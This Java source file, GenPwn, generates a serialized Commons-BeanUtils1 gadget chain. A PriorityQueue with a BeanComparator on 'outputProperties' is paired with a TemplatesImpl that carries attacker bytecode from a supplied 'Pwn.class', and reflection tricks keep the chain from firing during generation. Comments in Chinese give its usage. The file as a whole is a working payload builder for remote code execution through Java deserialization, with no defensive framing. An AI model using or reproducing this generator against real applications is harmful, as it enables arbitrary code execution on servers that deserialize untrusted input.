import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/** 组装 CB1 对象图（PriorityQueue+BeanComparator+TemplatesImpl[_bytecodes=Pwn.class]）。
 *  生成期间不触发 BeanComparator（避免生成端依赖 commons-logging）。
 *  用法: java -cp ".:beanutils:collections" GenPwn <Pwn.class> <out.ser> */
public class GenPwn {
    static void setF(Class<?> c, Object o, String n, Object v) throws Exception {
        Field f = c.getDeclaredField(n);
        f.setAccessible(true);
        f.set(o, v);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = readAll(args[0]);
        String out = args[1];
        System.out.println("[*] bytecode: " + code.length + " bytes");

        Class<?> tc = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = tc.newInstance();
        setF(tc, templates, "_bytecodes", new byte[][]{code});
        setF(tc, templates, "_name", "pwn");
        try {
            Class<?> tfc = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
            setF(tc, templates, "_tfactory", tfc.newInstance());
        } catch (Throwable t) {
            System.out.println("[i] _tfactory skip: " + t);
        }

        Class<?> bc = Class.forName("org.apache.commons.beanutils.BeanComparator");
        Comparator comparator = (Comparator) bc.getConstructor(String.class).newInstance("lowestSetBit");

        // 自然序构造队列（不触发 BeanComparator.compare），随后反射替换 comparator 与 queue
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add(1);
        queue.add(1);
        setF(bc, comparator, "property", "outputProperties");
        setF(PriorityQueue.class.cast(queue), "comparator", comparator);
        setF(PriorityQueue.class.cast(queue), "queue", new Object[]{templates, templates});

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out));
        oos.writeObject(queue);
        oos.close();
        System.out.println("OK " + out);
    }

    static void setF(Object o, String n, Object v) throws Exception {
        Class<?> c = o.getClass();
        while (c != null) {
            try {
                Field f = c.getDeclaredField(n);
                f.setAccessible(true);
                f.set(o, v);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(n);
    }

    static byte[] readAll(String p) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        FileInputStream in = new FileInputStream(p);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return bos.toByteArray();
    }
}
